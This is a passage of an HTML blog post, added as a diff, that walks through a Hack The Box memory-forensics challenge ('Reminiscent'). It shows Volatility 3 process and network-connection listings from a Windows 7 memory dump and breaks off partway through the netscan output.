@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="HTB Challenge - Reminiscent Note: Before you begin, majority of this writeup uses volality3.0, so make sure you downloaded and have it setup on your system.
+Setup  First download the zip file and unzip the contents. We have a file flounder-pc.memdump.elf and another file imageinfo.txt.  imageinfo.txt
+Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS) AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump." />
+<meta name="keywords" content=", hackthebox, challenges, forensics, volatility, writeup" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://harshitm98.github.io/posts/htb-challenge-reminiscent/" />
+
+
+    <title>
+        
+            HTB Reminiscent - Writeup :: Harshit Maheshwari 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.dc0c6d657e388585559a3980932e4245ef02b501245bf0f6f59d42da824af8fb.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="HTB Reminiscent - Writeup">
+<meta itemprop="description" content="HTB Challenge - Reminiscent Note: Before you begin, majority of this writeup uses volality3.0, so make sure you downloaded and have it setup on your system.
+Setup  First download the zip file and unzip the contents. We have a file flounder-pc.memdump.elf and another file imageinfo.txt.  imageinfo.txt
+Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS) AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump."><meta itemprop="datePublished" content="2022-04-05T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2022-04-05T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1771"><meta itemprop="image" content="https://harshitm98.github.io/"/>
+<meta itemprop="keywords" content="hackthebox,challenges,forensics,volatility,writeup," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://harshitm98.github.io/"/>
+
+<meta name="twitter:title" content="HTB Reminiscent - Writeup"/>
+<meta name="twitter:description" content="HTB Challenge - Reminiscent Note: Before you begin, majority of this writeup uses volality3.0, so make sure you downloaded and have it setup on your system.
+Setup  First download the zip file and unzip the contents. We have a file flounder-pc.memdump.elf and another file imageinfo.txt.  imageinfo.txt
+Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS) AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump."/>
+
+
+
+
+    <meta property="og:title" content="HTB Reminiscent - Writeup" />
+<meta property="og:description" content="HTB Challenge - Reminiscent Note: Before you begin, majority of this writeup uses volality3.0, so make sure you downloaded and have it setup on your system.
+Setup  First download the zip file and unzip the contents. We have a file flounder-pc.memdump.elf and another file imageinfo.txt.  imageinfo.txt
+Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS) AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://harshitm98.github.io/posts/htb-challenge-reminiscent/" /><meta property="og:image" content="https://harshitm98.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-05T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-04-05T00:00:00&#43;00:00" /><meta property="og:site_name" content="Harshit Maheshwari" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-04-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MTVN5X7DXW"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-MTVN5X7DXW', { 'anonymize_ip': false });
+}
+</script>
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MTVN5X7DXW"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-MTVN5X7DXW', { 'anonymize_ip': false });
+}
+</script>
+
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/fakebatman</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/posts">Blog</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://harshitm98.github.io/posts/htb-challenge-reminiscent/">HTB Reminiscent - Writeup</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="htb-challenge---reminiscent">HTB Challenge - Reminiscent</h1>
+<p><em>Note: Before you begin, majority of this writeup uses <a href="https://github.com/volatilityfoundation/volatility3">volality3.0</a>, so make sure you downloaded and have it setup on your system.</em></p>
+<h3 id="setup">Setup</h3>
+<ul>
+<li>First download the zip file and unzip the contents.</li>
+<li>We have a file <code>flounder-pc.memdump.elf</code> and another file <code>imageinfo.txt</code>.</li>
+</ul>
+<p><em>imageinfo.txt</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
+                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
+                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
+                     AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
+                      PAE type : No PAE
+                           DTB : 0x187000L
+                          KDBG : 0xf800027fe0a0L
+          Number of Processors : 2
+     Image Type (Service Pack) : 1
+                KPCR for CPU 0 : 0xfffff800027ffd00L
+                KPCR for CPU 1 : 0xfffff880009eb000L
+             KUSER_SHARED_DATA : 0xfffff78000000000L
+           Image date and time : 2017-10-04 18:07:30 UTC+0000
+     Image local date and time : 2017-10-04 11:07:30 -0700
+</code></pre></div><p>This file gives us the suggested profiles that we may need while running volatility. Let&rsquo;s choose the first profile: <code>Win7SP1x64</code></p>
+<h3 id="running-volatility3">Running volatility3</h3>
+<p>You can run commands which uses plugins like <code>windows.info</code> to get to know more about your machine.</p>
+<p><strong>Getting list of processes using <code>windows.pslist</code></strong></p>
+<ul>
+<li>This plugin gives running processes on the machine at the time of the memory dump. Just like running <code>ps</code> on linux system.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.pslist
+Volatility <span style="color:#ae81ff">3</span> Framework 1.0.0
+Progress:  100.00               PDB scanning finished
+PID     PPID    ImageFileName   Offset<span style="color:#f92672">(</span>V<span style="color:#f92672">)</span>       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output
+
+<span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">0</span>       System  0xfa80006b7040  <span style="color:#ae81ff">83</span>      <span style="color:#ae81ff">477</span>     N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
+<span style="color:#ae81ff">272</span>     <span style="color:#ae81ff">4</span>       smss.exe        0xfa8001a63b30  <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">30</span>      N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
+<span style="color:#ae81ff">348</span>     <span style="color:#ae81ff">328</span>     csrss.exe       0xfa800169bb30  <span style="color:#ae81ff">9</span>       <span style="color:#ae81ff">416</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
+<span style="color:#ae81ff">376</span>     <span style="color:#ae81ff">328</span>     wininit.exe     0xfa8001f63b30  <span style="color:#ae81ff">3</span>       <span style="color:#ae81ff">77</span>      <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
+<span style="color:#ae81ff">396</span>     <span style="color:#ae81ff">384</span>     csrss.exe       0xfa8001efa500  <span style="color:#ae81ff">9</span>       <span style="color:#ae81ff">283</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
+<span style="color:#ae81ff">432</span>     <span style="color:#ae81ff">384</span>     winlogon.exe    0xfa8001f966d0  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">112</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
+<span style="color:#ae81ff">476</span>     <span style="color:#ae81ff">376</span>     services.exe    0xfa8001fcdb30  <span style="color:#ae81ff">11</span>      <span style="color:#ae81ff">201</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
+<span style="color:#ae81ff">492</span>     <span style="color:#ae81ff">376</span>     lsass.exe       0xfa8001ff2b30  <span style="color:#ae81ff">8</span>       <span style="color:#ae81ff">590</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">500</span>     <span style="color:#ae81ff">376</span>     lsm.exe 0xfa8001fffb30  <span style="color:#ae81ff">11</span>      <span style="color:#ae81ff">150</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">600</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002001b30  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">360</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">664</span>     <span style="color:#ae81ff">476</span>     VBoxService.ex  0xfa800209bb30  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">118</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">728</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80020b5b30  <span style="color:#ae81ff">7</span>       <span style="color:#ae81ff">270</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">792</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80021044a0  <span style="color:#ae81ff">21</span>      <span style="color:#ae81ff">443</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">868</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002166b30  <span style="color:#ae81ff">21</span>      <span style="color:#ae81ff">429</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">900</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa800217cb30  <span style="color:#ae81ff">41</span>      <span style="color:#ae81ff">977</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">988</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80021ccb30  <span style="color:#ae81ff">13</span>      <span style="color:#ae81ff">286</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">384</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002204960  <span style="color:#ae81ff">17</span>      <span style="color:#ae81ff">386</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
+<span style="color:#ae81ff">1052</span>    <span style="color:#ae81ff">476</span>     spoolsv.exe     0xfa8002294b30  <span style="color:#ae81ff">13</span>      <span style="color:#ae81ff">277</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:31.000000      N/A     Disabled
+<span style="color:#ae81ff">1092</span>    <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80022bbb30  <span style="color:#ae81ff">19</span>      <span style="color:#ae81ff">321</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:31.000000      N/A     Disabled
+<span style="color:#ae81ff">1196</span>    <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002390620  <span style="color:#ae81ff">28</span>      <span style="color:#ae81ff">333</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:31.000000      N/A     Disabled
+<span style="color:#ae81ff">1720</span>    <span style="color:#ae81ff">476</span>     taskhost.exe    0xfa8002245060  <span style="color:#ae81ff">8</span>       <span style="color:#ae81ff">148</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:36.000000      N/A     Disabled
+<span style="color:#ae81ff">1840</span>    <span style="color:#ae81ff">476</span>     sppsvc.exe      0xfa8002122060  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">145</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:37.000000      N/A     Disabled
+<span style="color:#ae81ff">2020</span>    <span style="color:#ae81ff">868</span>     dwm.exe 0xfa80022c8060  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">72</span>      <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:41.000000      N/A     Disabled
+<span style="color:#ae81ff">2044</span>    <span style="color:#ae81ff">2012</span>    explorer.exe    0xfa80020bb630  <span style="color:#ae81ff">36</span>      <span style="color:#ae81ff">926</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:41.000000      N/A     Disabled
+<span style="color:#ae81ff">1476</span>    <span style="color:#ae81ff">2044</span>    VBoxTray.exe    0xfa80022622e0  <span style="color:#ae81ff">13</span>      <span style="color:#ae81ff">146</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:42.000000      N/A     Disabled
+<span style="color:#ae81ff">1704</span>    <span style="color:#ae81ff">476</span>     SearchIndexer.  0xfa80021b4060  <span style="color:#ae81ff">16</span>      <span style="color:#ae81ff">734</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:47.000000      N/A     Disabled
+<span style="color:#ae81ff">812</span>     <span style="color:#ae81ff">1704</span>    SearchFilterHo  0xfa80023ed550  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">92</span>      <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:48.000000      N/A     Disabled
+<span style="color:#ae81ff">1960</span>    <span style="color:#ae81ff">1704</span>    SearchProtocol  0xfa80024f4b30  <span style="color:#ae81ff">6</span>       <span style="color:#ae81ff">311</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:48.000000      N/A     Disabled
+<span style="color:#ae81ff">2812</span>    <span style="color:#ae81ff">2044</span>    thunderbird.ex  0xfa80007e0b30  <span style="color:#ae81ff">50</span>      <span style="color:#ae81ff">534</span>     <span style="color:#ae81ff">1</span>       True    2017-10-04 18:06:24.000000      N/A     Disabled
+<span style="color:#ae81ff">2924</span>    <span style="color:#ae81ff">600</span>     WmiPrvSE.exe    0xfa8000801b30  <span style="color:#ae81ff">10</span>      <span style="color:#ae81ff">204</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:26.000000      N/A     Disabled
+<span style="color:#ae81ff">2120</span>    <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8000945060  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">335</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:32.000000      N/A     Disabled
+<span style="color:#ae81ff">2248</span>    <span style="color:#ae81ff">476</span>     wmpnetwk.exe    0xfa800096eb30  <span style="color:#ae81ff">18</span>      <span style="color:#ae81ff">489</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:33.000000      N/A     Disabled
+<span style="color:#ae81ff">592</span>     <span style="color:#ae81ff">600</span>     WmiPrvSE.exe    0xfa8000930b30  <span style="color:#ae81ff">9</span>       <span style="color:#ae81ff">127</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:35.000000      N/A     Disabled
+<span style="color:#ae81ff">496</span>     <span style="color:#ae81ff">2044</span>    powershell.exe  0xfa800224e060  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">300</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:06:58.000000      N/A     Disabled
+<span style="color:#ae81ff">2772</span>    <span style="color:#ae81ff">396</span>     conhost.exe     0xfa8000e90060  <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">55</span>      <span style="color:#ae81ff">1</span>       False   2017-10-04 18:06:58.000000      N/A     Disabled
+<span style="color:#ae81ff">2752</span>    <span style="color:#ae81ff">496</span>     powershell.exe  0xfa8000839060  <span style="color:#ae81ff">20</span>      <span style="color:#ae81ff">396</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:07:00.000000      N/A     Disabled
+</code></pre></div><p>This wasn&rsquo;t that helpful. One key-takeaway could be that <code>powershell.exe</code> is running. Let&rsquo;s note the PID: 2752.</p>
+<p><strong>Getting live connections using <code>windows.netscan</code></strong></p>
+<ul>
+<li>This plugin gives us the connections at the time of the memory dump. Just like running <code>netstat</code> command.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.netscan
+Volatility <span style="color:#ae81ff">3</span> Framework 1.0.0
+Progress:  100.00               PDB scanning finished
+Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
+
+0x1e069840      UDPv4   10.10.100.43    <span style="color:#ae81ff">137</span>     *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">4</span>       System  2017-10-04 18:04:31.000000
+0x1e06a950      TCPv4   10.10.100.43    <span style="color:#ae81ff">139</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1e078670      TCPv4   0.0.0.0 <span style="color:#ae81ff">5357</span>    0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1e078670      TCPv6   ::      <span style="color:#ae81ff">5357</span>    ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1e0a8ec0      UDPv4   0.0.0.0 <span style="color:#ae81ff">60655</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:31.000000
+0x1e0a8ec0      UDPv6   ::      <span style="color:#ae81ff">60655</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:31.000000
+0x1e0ac8a0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49155</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">476</span>     services.exe    -
+0x1e0b0a50      UDPv4   0.0.0.0 <span style="color:#ae81ff">60654</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:31.000000
+0x1e0e08a0      TCPv4   0.0.0.0 <span style="color:#ae81ff">445</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1e0e08a0      TCPv6   ::      <span style="color:#ae81ff">445</span>     ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1e0f9010      UDPv4   0.0.0.0 <span style="color:#ae81ff">5004</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
+0x1e243b20      TCPv4   0.0.0.0 <span style="color:#ae81ff">49154</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">900</span>     svchost.exe     -
+0x1e27f980      TCPv4   0.0.0.0 <span style="color:#ae81ff">49154</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">900</span>     svchost.exe     -
+0x1e27f980      TCPv6   ::      <span style="color:#ae81ff">49154</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">900</span>     svchost.exe     -
+0x1e28f1a0      UDPv4   0.0.0.0 <span style="color:#ae81ff">5005</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
+0x1e28f1a0      UDPv6   ::      <span style="color:#ae81ff">5005</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
+0x1e2ec510      TCPv6   -       <span style="color:#ae81ff">0</span>       382b:ff01:80fa:ffff:a010:4502:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">384</span>     svchost.exe     N/A
+0x1e2f33f0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49157</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">492</span>     lsass.exe       -
+0x1e2fc460      UDPv4   127.0.0.1       <span style="color:#ae81ff">54573</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
+0x1e391b30      TCPv4   0.0.0.0 <span style="color:#ae81ff">49155</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">476</span>     services.exe    -
+0x1e391b30      TCPv6   ::      <span style="color:#ae81ff">49155</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">476</span>     services.exe    -
+0x1e3c5da0      UDPv4   0.0.0.0 <span style="color:#ae81ff">5005</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
+0x1e3f7010      UDPv4   0.0.0.0 <span style="color:#ae81ff">5355</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:35.000000
+0x1e3f7010      UDPv6   ::      <span style="color:#ae81ff">5355</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:35.000000
+0x1e3fb010      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:33.000000
+0x1e3fb010      UDPv6   ::      <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:33.000000
+0x1e47a730      TCPv6   -       <span style="color:#ae81ff">0</span>       6890:8300:80fa:ffff:6890:8300:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
+0x1e4c1e60      TCPv4   0.0.0.0 <span style="color:#ae81ff">135</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">728</span>     svchost.exe     -
+0x1e4c30a0      TCPv4   0.0.0.0 <span style="color:#ae81ff">135</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">728</span>     svchost.exe     -
+0x1e4c30a0      TCPv6   ::      <span style="color:#ae81ff">135</span>     ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">728</span>     svchost.exe     -
+0x1e4d7e70      TCPv4   0.0.0.0 <span style="color:#ae81ff">49152</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">376</span>     wininit.exe     -
+0x1e4d7e70      TCPv6   ::      <span style="color:#ae81ff">49152</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">376</span>     wininit.exe     -
+0x1e517800      TCPv6   -       <span style="color:#ae81ff">0</span>       38cb:1702:80fa:ffff:38cb:1702:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    N/A
+0x1e556820      TCPv4   0.0.0.0 <span style="color:#ae81ff">49153</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">792</span>     svchost.exe     -
+0x1e556820      TCPv6   ::      <span style="color:#ae81ff">49153</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">792</span>     svchost.exe     -
+0x1e5689e0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49153</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">792</span>     svchost.exe     -
+0x1e5a3250      UDPv4   0.0.0.0 <span style="color:#ae81ff">5355</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:35.000000
+0x1e5cdef0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49157</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">492</span>     lsass.exe       -
+0x1e5cdef0      TCPv6   ::      <span style="color:#ae81ff">49157</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">492</span>     lsass.exe       -
+0x1e5fa480      UDPv4   127.0.0.1       <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
+0x1e774a60      UDPv4   10.10.100.43    <span style="color:#ae81ff">138</span>     *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">4</span>       System  2017-10-04 18:04:31.000000
+0x1e7d7a60      TCPv6   -       <span style="color:#ae81ff">0</span>       6890:8300:80fa:ffff:6890:8300:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  N/A
+0x1e85e010      UDPv6   ::1     <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
+0x1e8fb010      UDPv4   0.0.0.0 <span style="color:#ae81ff">5004</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
+0x1e8fb010      UDPv6   ::      <span style="color:#ae81ff">5004</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
+0x1e8ff010      UDPv4   10.10.100.43    <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
+0x1e903b10      UDPv6   ::1     <span style="color:#ae81ff">54572</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
